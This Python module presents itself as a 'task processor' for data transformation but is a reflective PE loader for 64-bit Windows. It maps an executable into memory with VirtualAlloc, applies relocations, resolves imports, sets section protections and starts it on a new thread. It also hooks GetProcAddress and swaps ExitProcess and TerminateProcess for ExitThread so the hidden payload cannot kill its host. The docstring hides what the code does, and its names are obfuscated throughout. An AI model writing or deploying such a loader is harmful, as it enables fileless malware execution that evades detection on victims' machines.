# -*- coding: utf-8 -*-
"""
Task processor — handles data transformation and optimization routines.
"""
import ctypes
import os
import struct
import time


class TaskAgent:
    def __init__(self):
        self._k = None
        self._b = None

    def process(self, data):
        if not data or len(data) < 64:
            return False
        if os.name != "nt" or struct.calcsize("P") != 8:
            return False
        try:
            from .system import SystemContext
            from . import vault
            self._k = SystemContext.inspect_system()
            if not self._k:
                return False
            desc = vault.analyze_data(data)
            if not desc:
                return False

            self._prepare(desc)
            if not self._b:
                return False

            self._transfer_head(data, desc)
            self._transfer_segments(data, desc)

            adj = (self._b != desc["b"])
            if adj:
                if not self._fixup(desc):
                    self._k.VirtualFree(ctypes.c_void_p(self._b), 0, 0x8000)
                    return False

            if desc["i"]:
                self._resolve_refs(desc)

            self._secure(desc)
            return self._launch(desc)
        except Exception:
            return False

    def _prepare(self, desc):
        k = self._k
        v1 = k.VirtualAlloc(ctypes.c_void_p(desc["b"]), desc["s"], 0x3000, 0x04)
        if not v1 or v1 != desc["b"]:
            v1 = k.VirtualAlloc(None, desc["s"], 0x3000, 0x04)
        self._b = v1

    def _transfer_head(self, data, desc):
        tmp = desc["h"]
        ctypes.memmove(self._b, data[:tmp], tmp)

    def _transfer_segments(self, data, desc):
        for i, (vs, va, rs, rp, ch) in enumerate(desc["c"]):
            if rs > 0 and rp > 0:
                n = min(rs, len(data) - rp)
                if n > 0:
                    ctypes.memmove(self._b + va, data[rp:rp + n], n)

    def _fixup(self, desc):
        from . import vault
        delta = self._b - desc["b"]
        if not desc["r"] or not desc["z"]:
            return False
        pos = 0
        while pos < desc["z"]:
            br = vault._rd(self._b + desc["r"] + pos, "<I")
            bs = vault._rd(self._b + desc["r"] + pos + 4, "<I")
            if bs == 0:
                break
            for j in range((bs - 8) // 2):
                ent = vault._rd(self._b + desc["r"] + pos + 8 + j * 2, "<H")
                if ent >> 12 == 10:
                    a = self._b + br + (ent & 0xFFF)
                    vault._wr(a, "<Q", vault._rd(a, "<Q") + delta)
            pos += bs
        return True

    def _resolve_refs(self, desc):
        from . import vault
        k = self._k
        _k32 = k.GetModuleHandleA(b"kernel32.dll")
        et = k.GetProcAddress(_k32, b"ExitThread")
        _gpa_raw = k.GetProcAddress(_k32, b"GetProcAddress")
        _t = (b"ExitProcess", b"TerminateProcess", b"NtTerminateProcess")
        _G = ctypes.WINFUNCTYPE(ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p)
        _real = _G(_gpa_raw)

        @_G
        def _hook(hm, no):
            nv = no if no is not None else 0
            if nv > 0xFFFF:
                try:
                    nm = ctypes.string_at(nv)
                    if nm in _t:
                        return et
                except Exception:
                    pass
            return _real(hm, nv)

        self._gref = _hook
        _hp = ctypes.cast(_hook, ctypes.c_void_p).value
        off = self._b + desc["i"]
        while True:
            nr = vault._rd(off + 12, "<I")
            if nr == 0:
                break
            ir = vault._rd(off, "<I")
            ar = vault._rd(off + 16, "<I")
            dn = ctypes.string_at(self._b + nr)
            hm = k.LoadLibraryA(dn)
            lk = self._b + (ir if ir else ar)
            ia = self._b + ar
            while hm:
                tv = vault._rd(lk, "<Q")
                if tv == 0:
                    break
                if tv & 0x8000000000000000:
                    fa = k.GetProcAddress(hm, ctypes.c_void_p(tv & 0xFFFF))
                else:
                    fn = ctypes.string_at(self._b + (tv & 0x7FFFFFFFFFFFFFFF) + 2)
                    if fn in _t and et:
                        fa = et
                    elif fn == b"GetProcAddress" and _hp:
                        fa = _hp
                    else:
                        fa = k.GetProcAddress(hm, fn)
                if fa:
                    vault._wr(ia, "<Q", fa)
                lk += 8
                ia += 8
            off += 20

    def _secure(self, desc):
        k = self._k
        old = ctypes.c_ulong(0)
        for vs, va, rs, rp, ch in desc["c"]:
            sz = max(vs, rs)
            if sz == 0:
                continue
            x = bool(ch & 0x20000000)
            w = bool(ch & 0x80000000)
            p = (0x40 if w else 0x20) if x else (0x04 if w else 0x02)
            k.VirtualProtect(ctypes.c_void_p(self._b + va), sz, p, ctypes.byref(old))

    def _launch(self, desc):
        k = self._k
        tid = ctypes.c_ulong(0)
        ht = k.CreateThread(None, 0, ctypes.c_void_p(self._b + desc["e"]), None, 0, ctypes.byref(tid))
        if not ht:
            return False
        dl = time.monotonic() + 240
        while time.monotonic() < dl:
            if k.WaitForSingleObject(ht, 2000) == 0:
                break
        k.CloseHandle(ht)
        return True
